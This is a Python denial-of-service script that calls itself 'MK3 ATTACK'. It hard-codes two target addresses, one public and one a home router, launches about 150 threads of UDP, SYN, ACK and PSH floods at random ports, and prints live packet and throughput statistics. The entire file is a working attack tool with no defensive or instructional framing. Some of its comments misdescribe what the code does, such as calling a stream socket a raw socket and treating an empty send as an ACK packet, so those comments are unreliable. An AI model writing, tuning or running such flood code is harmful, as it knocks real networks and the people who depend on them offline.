import socket
import threading
import time
import random
import struct

# Two target IPs
router_ips = ["62.109.121.42", "192.168.1.1"]  # Add your second IP here

# Colors
MAGENTA = '\033[95m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BLUE = '\033[94m'
RESET = '\033[0m'

# Attack configuration
THREADS_PER_TARGET = 75  # 75 threads per IP, 150 total (15x V2)
UDP_THREADS = 30         # 60 total UDP threads
SYN_THREADS = 30         # 60 total SYN threads  
ACK_THREADS = 10         # 20 total ACK threads
PSH_THREADS = 5          # 10 total PSH threads

# Connection pools
udp_pools = {ip: [] for ip in router_ips}
syn_pools = {ip: [] for ip in router_ips}
ack_pools = {ip: [] for ip in router_ips}
psh_pools = {ip: [] for ip in router_ips}
pool_lock = threading.Lock()

# Stats tracking
stats = {
    ip: {
        "udp_sent": 0,
        "syn_sent": 0,
        "ack_sent": 0,
        "psh_sent": 0,
        "udp_data": 0,
        "syn_data": 0,
        "ack_data": 0,
        "psh_data": 0,
        "success": 0,
        "fail": 0
    }
    for ip in router_ips
}
stats_lock = threading.Lock()

# Generate random payloads
def gen_payload():
    size = random.randint(1000, 1450)
    return random.randbytes(size)

# UDP Flood (Enhanced)
def udp_flood(target_ip):
    # Create socket pool for this thread
    sockets = []
    for _ in range(3):  # 3 sockets per thread
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.001)
            sockets.append(sock)
        except:
            pass
    
    while True:
        try:
            payload = gen_payload()
            port = random.randint(1, 65535)
            
            # Send from all sockets in pool
            for sock in sockets:
                try:
                    sock.sendto(payload, (target_ip, port))
                    data_sent = len(payload)
                    
                    with stats_lock:
                        stats[target_ip]["udp_sent"] += 1
                        stats[target_ip]["udp_data"] += data_sent
                        stats[target_ip]["success"] += 1
                except:
                    with stats_lock:
                        stats[target_ip]["fail"] += 1
            
            # Poison effect: random micro-delay
            if random.random() < 0.3:  # 30% chance
                time.sleep(random.uniform(0.0001, 0.01))
                
        except:
            with stats_lock:
                stats[target_ip]["fail"] += 1

# SYN Flood (Enhanced)
def syn_flood(target_ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)  # 10x faster timeout
            port = random.randint(1, 65535)
            
            # Send multiple SYNs from same socket
            for _ in range(random.randint(3, 10)):
                try:
                    result = sock.connect_ex((target_ip, port))
                    with stats_lock:
                        stats[target_ip]["syn_sent"] += 1
                        stats[target_ip]["syn_data"] += 64
                        if result == 0:
                            stats[target_ip]["success"] += 1
                        else:
                            stats[target_ip]["fail"] += 1
                    
                    # Change port for next attempt
                    port = random.randint(1, 65535)
                except:
                    with stats_lock:
                        stats[target_ip]["fail"] += 1
            
            sock.close()
            
            # Poison effect
            if random.random() < 0.4:
                time.sleep(random.uniform(0.0005, 0.005))
                
        except:
            with stats_lock:
                stats[target_ip]["fail"] += 1

# ACK Flood (New method)
def ack_flood(target_ip):
    while True:
        try:
            # Raw socket for ACK packets (no root needed for certain sizes)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            
            # Create pseudo-connection
            sock.connect((target_ip, 80))
            
            # Send multiple ACK-like packets
            for _ in range(random.randint(5, 15)):
                try:
                    # Send empty data with ACK flag
                    sock.send(b'')
                    with stats_lock:
                        stats[target_ip]["ack_sent"] += 1
                        stats[target_ip]["ack_data"] += 40
                        stats[target_ip]["success"] += 1
                    
                    # Poison delay
                    if random.random() < 0.2:
                        time.sleep(0.0001)
                        
                except:
                    with stats_lock:
                        stats[target_ip]["fail"] += 1
            
            sock.close()
            
        except:
            # Try different port
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((target_ip, random.randint(1, 65535)))
                sock.close()
                with stats_lock:
                    stats[target_ip]["success"] += 1
            except:
                with stats_lock:
                    stats[target_ip]["fail"] += 1

# PSH Flood (New method)
def psh_flood(target_ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.002)  # Slightly longer for PSH
            
            port = random.choice([80, 443, 8080, 53, 21, 22, 25])
            result = sock.connect_ex((target_ip, port))
            
            if result == 0 or random.random() < 0.7:  # 70% send attempt anyway
                # Send push data
                psh_data = random.randbytes(random.randint(100, 500))
                for _ in range(random.randint(2, 8)):
                    try:
                        sock.send(psh_data)
                        with stats_lock:
                            stats[target_ip]["psh_sent"] += 1
                            stats[target_ip]["psh_data"] += len(psh_data)
                            stats[target_ip]["success"] += 1
                    except:
                        with stats_lock:
                            stats[target_ip]["fail"] += 1
            
            sock.close()
            
            # Poison effect
            if random.random() < 0.5:
                time.sleep(random.uniform(0.001, 0.02))
                
        except:
            with stats_lock:
                stats[target_ip]["fail"] += 1

# Start attack threads
def start_attacks():
    print(f"{MAGENTA}MK3 ATTACK STARTING - 15X V2 POWER{RESET}")
    print(f"{MAGENTA}Threads per target: {THREADS_PER_TARGET}{RESET}")
    
    for ip in router_ips:
        print(f"{YELLOW}Target: {ip}{RESET}")
        
        # Start UDP threads
        for _ in range(UDP_THREADS):
            threading.Thread(target=udp_flood, args=(ip,), daemon=True).start()
        
        # Start SYN threads
        for _ in range(SYN_THREADS):
            threading.Thread(target=syn_flood, args=(ip,), daemon=True).start()
        
        # Start ACK threads
        for _ in range(ACK_THREADS):
            threading.Thread(target=ack_flood, args=(ip,), daemon=True).start()
        
        # Start PSH threads
        for _ in range(PSH_THREADS):
            threading.Thread(target=psh_flood, args=(ip,), daemon=True).start()
        
        print(f"  UDP: {UDP_THREADS} threads | SYN: {SYN_THREADS} threads")
        print(f"  ACK: {ACK_THREADS} threads | PSH: {PSH_THREADS} threads")

# Start all attacks
start_attacks()

# Enhanced logging
last_time = time.time()
attack_start = time.time()

while True:
    time.sleep(0.05)  # Faster monitoring
    current_time = time.time()
    
    if current_time - last_time >= 5:  # Log every 5 seconds
        with stats_lock:
            total_combined = {
                "packets": 0,
                "data": 0,
                "success": 0,
                "fail": 0,
                "udp": 0,
                "syn": 0,
                "ack": 0,
                "psh": 0
            }
            
            elapsed = current_time - attack_start
            
            print(f"\n{MAGENTA}{'='*70}{RESET}")
            print(f"{MAGENTA}MK3 DUAL ATTACK - RUNNING {elapsed:.0f}s{RESET}")
            print(f"{MAGENTA}{'='*70}{RESET}")
            
            for idx, ip in enumerate(router_ips):
                ip_stats = stats[ip]
                
                # Calculate per-IP totals
                ip_packets = (ip_stats["udp_sent"] + ip_stats["syn_sent"] + 
                            ip_stats["ack_sent"] + ip_stats["psh_sent"])
                ip_data = (ip_stats["udp_data"] + ip_stats["syn_data"] + 
                         ip_stats["ack_data"] + ip_stats["psh_data"])
                
                # Add to combined
                total_combined["packets"] += ip_packets
                total_combined["data"] += ip_data
                total_combined["success"] += ip_stats["success"]
                total_combined["fail"] += ip_stats["fail"]
                total_combined["udp"] += ip_stats["udp_sent"]
                total_combined["syn"] += ip_stats["syn_sent"]
                total_combined["ack"] += ip_stats["ack_sent"]
                total_combined["psh"] += ip_stats["psh_sent"]
                
                # Display per-target
                color = YELLOW if idx == 0 else CYAN
                data_mb = ip_data / (1024 * 1024)
                pps = ip_packets / 5  # Per second (5s window)
                
                print(f"\n{color}╔ TARGET {idx+1}: {ip}{RESET}")
                print(f"{color}║ Packets: {GREEN}{ip_packets:,}{RESET} ({GREEN}{pps:,.0f}/s{RESET})")
                print(f"{color}║ Data: {GREEN}{data_mb:.2f}MB{RESET} ({GREEN}{data_mb/5:.2f}MB/s{RESET})")
                print(f"{color}║ Status: {GREEN}{ip_stats['success']:,} OK{RESET} | {RED}{ip_stats['fail']:,} FAIL{RESET}")
                print(f"{color}║ UDP: {BLUE}{ip_stats['udp_sent']:,}{RESET} | SYN: {BLUE}{ip_stats['syn_sent']:,}{RESET}")
                print(f"{color}║ ACK: {BLUE}{ip_stats['ack_sent']:,}{RESET} | PSH: {BLUE}{ip_stats['psh_sent']:,}{RESET}")
                print(f"{color}╚{'─'*40}{RESET}")
                
                # Reset per-IP stats
                stats[ip] = {
                    "udp_sent": 0,
                    "syn_sent": 0,
                    "ack_sent": 0,
                    "psh_sent": 0,
                    "udp_data": 0,
                    "syn_data": 0,
                    "ack_data": 0,
                    "psh_data": 0,
                    "success": 0,
                    "fail": 0
                }
            
            # Combined totals
            combined_data_mb = total_combined["data"] / (1024 * 1024)
            combined_pps = total_combined["packets"] / 5
            success_rate = (total_combined["success"] / (total_combined["success"] + total_combined["fail"]) * 100) if (total_combined["success"] + total_combined["fail"]) > 0 else 0
            
            print(f"\n{MAGENTA}📊 COMBINED TOTALS (5s):{RESET}")
            print(f"{GREEN}► Packets: {total_combined['packets']:,} ({combined_pps:,.0f}/s){RESET}")
            print(f"{GREEN}► Data: {combined_data_mb:.2f}MB ({combined_data_mb/5:.2f}MB/s){RESET}")
            print(f"{GREEN}► Success Rate: {success_rate:.1f}%{RESET}")
            print(f"{BLUE}► UDP: {total_combined['udp']:,} | SYN: {total_combined['syn']:,}{RESET}")
            print(f"{BLUE}► ACK: {total_combined['ack']:,} | PSH: {total_combined['psh']:,}{RESET}")
            
            # Estimated power vs V2
            estimated_power = combined_pps / 1000  # Rough estimate
            print(f"{MAGENTA}► Estimated Power: {estimated_power:.1f}x V2{RESET}")
            
            print(f"{MAGENTA}{'='*70}{RESET}")
            
        last_time = current_time
